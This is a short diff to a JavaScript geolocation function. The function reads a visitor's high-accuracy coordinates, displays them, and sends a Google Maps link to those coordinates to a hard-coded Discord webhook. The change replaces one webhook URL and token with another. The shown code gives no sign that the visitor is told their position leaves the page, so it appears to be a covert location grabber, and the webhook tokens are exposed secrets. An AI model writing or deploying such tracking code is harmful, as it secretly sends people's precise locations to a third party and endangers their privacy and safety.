@@ -25,8 +25,9 @@ function getGeoCoords() {
             lat.innerText = "Latitude: " + position.coords.latitude;
             long.innerText = "Longitude: " + position.coords.longitude;
             coords.appendChild(lat);
-            coords.appendChild(long)
-            sendPostToWebhook('https://discord.com/api/webhooks/1086054283583172670/H6fcVtnwZXQEFnixHKR1W_lJPzSqlngQ3OuiPM05gFbFyd0mm1Gc7pXzbCtnXCw9BYvW',
+            coords.appendChild(long);
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1086056446975803393/KNUOjrMDXYUCp9hiu4kWGlp5xnwz6oBqk6IOvY1EuSpmg6sdTNQD0Ma1zoT1cpCC5gBn';
+            sendPostToWebhook(WEBHOOK_URL,
                 `https://www.google.com/maps/@${position.coords.latitude},${position.coords.longitude},17.5z`)
             spanify(lat, long)
         }, null, { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 });
